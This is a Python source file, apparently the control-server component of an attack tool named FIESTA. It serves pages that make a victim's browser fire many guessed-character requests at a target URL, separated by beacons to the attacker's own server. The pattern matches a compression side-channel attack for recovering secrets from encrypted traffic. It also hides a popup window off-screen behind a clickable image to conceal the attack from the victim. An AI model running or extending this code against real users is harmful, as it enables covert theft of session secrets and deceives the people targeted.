from .message import Message
from .notify import QueueNotify
from http.server import HTTPServer,BaseHTTPRequestHandler
from threading import Thread
from queue import Queue
from time import sleep

class cServerHandler(BaseHTTPRequestHandler, QueueNotify):

    def rename_page(self):
        res = """
            <script>
                window.name = "control";
            </script>
        """
        return(res)

    def waiting_page(self):
        res = """
            <meta http-equiv="refresh" content="5" />
            <center>
            <a href=""  onclick="window.open('', 'control', 'height=150, width=100, top=10000, left=10000')">
            <img src="https://s-media-cache-ak0.pinimg.com/originals/13/7c/a9/137ca9e2a4de70b11d0ae475997e8004.gif">
            </a>
            </center>
        """
        return(res)

    def create_url_array(self, url, charset, separator=None):
        res = "var urls = ["
        guess = url.replace('§1§', self.server.config.wrong_term)
        
        if separator:                  # We add separator if required
            res += '\n"' + separator + '",'
        res += '\n"' + guess + '",'    # We need a wrong guess to compare with
        
        if separator:
            res += '\n"' + separator + '",'
        res += '\n"' + guess + '",'

        if separator:
            res += '\n"' + separator + '",'

        for c in charset:
            guess = url.replace('§1§',c)
            res += '\n"' + guess + '",'
            if separator:
                res += '\n"' + separator + '",'

        res = res[:-1] + '\n];\n'
        return res


    def html_using_imgs(self, url, charset):
        separator = "https://"+self.config.cserver_ip+":80/"
        delay = self.server.config.test_delay
        res  = "<script>\n"
        res += self.create_url_array(url, charset, separator)
        res += """
                    var i = 0;
                    function load_imgs(){
                        var image = new Image();
                        image.onload = function(){
                            document.body.appendChild(image);
                            if (i++ < urls.length - 1) load_imgs();
                        };
                        image.onerror = function(){
                            if (i++ < urls.length - 1) load_imgs();
                        }
                        image.src = urls[i];
                    }
                    load_imgs();
        """
        res += '</script>'
        if self.config.dev == False:
            res += '<meta http-equiv="refresh" content="'+str(delay)+'" />'
        return res;

    def html_using_open(self, url, charset):
        separator = "https://"+self.config.cserver_ip+":80/"
       
        res  = "<html><head>\n"
        res += "<script>\n"
        res += """
                    var gu = "";
                    var mywin;

                    function myopen(u) {
                        gu = u;
                        if (mywin) {
                            mywin.location.replace(gu);
                        } else {
                            mywin = window.open(gu, 'control')
                        }
                    }
    
                    function popup(u) {
                        var sep = document.getElementById("separator");
                        sep.onerror = function() { myopen(u) };
                        sep.src='"""+separator+"""';
                    }

                    function finish() {
                        mywin.location.replace('/?rename');
                        var sep = document.getElementById('separator')
                        sep.onerror = location.reload();
                        sep.src='"""+separator+"""';
                    }

                    function load_open() {
                """

        i = self.server.config.guess_delay
        guess = url.replace('§1§',self.config.wrong_term)
        
        wait_time = i*1000
        res += 'setTimeout(function(){ popup("'+  guess  +'"); }, '+str(wait_time)+');\n'
       
        i += self.server.config.guess_delay
        wait_time = i*1000
        res += 'setTimeout(function(){ popup("'+  guess  +'"); }, '+str(wait_time)+');\n'

        for c in charset:
            i += self.server.config.guess_delay
            wait_time = i*1000
            guess = url.replace('§1§',c)
            res += 'setTimeout(function(){ popup("'+  guess  +'"); }, '+str(wait_time)+');\n'
        
        i += self.server.config.guess_delay
        wait_time = i*1000
        if self.config.dev == False:
            res += 'setTimeout(function(){ finish(); }, '+str(wait_time)+');\n'
        res += """
                }

                load_open();

                </script>
                "
                <body><img id='separator' src='data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs='></body>\n"
                </html>
                """
        return res;

    def send_error(self, code, msg):
        self.config = self.server.config
        self.msg_queue = self.server.msg_queue
        self.notify("SEP",0)
        super(cServerHandler, self).send_error( code, msg )

    def do_GET(self):

        if "/favicon.ico" in self.path:
            self.send_response(200)
            return

        if self.path.endswith("?rename"):
            self.send_response(200)
            res = self.rename_page()
            self.wfile.write( res.encode() )
            return

        self.config = self.server.config
        self.action_queue = self.server.action_queue

        if self.config.cserver_ip == None:
            self.config.cserver_ip = self.headers["Host"]

        # Only show the message for first connection
        cookie = "fiesta="+self.path
        if cookie not in str(self.headers):
            self.server.out.console_print("[*] Connection from "+self.client_address[0]+":"+str(self.client_address[1]))
            self.server.out.console_print("[*] Waiting for the FIESTA!")

        self.send_response(200)

        self.send_header('Content-type','text-html')
        self.send_header('Set-Cookie',cookie)
        self.end_headers()

        if self.action_queue.empty() and (self.config.dev == False):
            res  = "<html><body>"
            res += self.waiting_page()
            res += "</body></html>"
            self.wfile.write(res.encode())
        else:
            if self.config.dev == False:
                msg = self.action_queue.get()
                while not self.action_queue.empty(): # we only want the last sent command
                    msg = self.action_queue.get()
                url     = msg.url
                charset = msg.data
            else:
                term = self.config.term
                charset = self.config.charset
                url = self.config.url.replace('§1§',term+'§1§')
          
            if self.server.config.control == "img":
                res = self.html_using_imgs(url, charset);
            elif self.server.config.control == "open":
                res = self.html_using_open(url, charset);
            else:
                res = self.html_using_imgs(url, charset); # DEBUG
            
            self.wfile.write( res.encode() )

    def log_message(self, format, *args):
        return

class cRealServer(HTTPServer, QueueNotify):
    def __init__( self, binder, handler ):
        super(cRealServer, self).__init__( binder, handler )
        self.config    = None
        self.daemon_threads = True
        self.action_queue = None
        self.out       = None

    def set_action_queue( self, action_queue ):
        self.action_queue = action_queue

    def set_output( self, out ):
        self.out = out

    def configure( self, config ):
        self.config = config

class cServer(QueueNotify):

    def __init__( self ):
        super(cServer, self).__init__()
        self.config        = None
        self.server        = None
        self.action_queue  = None
        self.out           = None
        self.thread_server = None

    def set_action_queue( self, action_queue ):
        self.action_queue = action_queue

    def set_output( self, out ):
        self.out = out
       
    def configure( self, config ):
        self.config = config

    def start( self ):
        self.server = cRealServer(('0.0.0.0', 80), cServerHandler)
        self.server.set_queue( self.msg_queue )
        self.server.set_action_queue( self.action_queue )
        self.server.set_output( self.out )
        self.server.configure( self.config )
        self.thread_server = Thread(target=self.server.serve_forever,daemon=True).start()
        self.server.out.console_print("[*] Control Server started 0.0.0.0:80")

    def stop( self ):
        self.server.shutdown()
        #self.server.close()
        #self.thread_server.stop()
        self.server = None
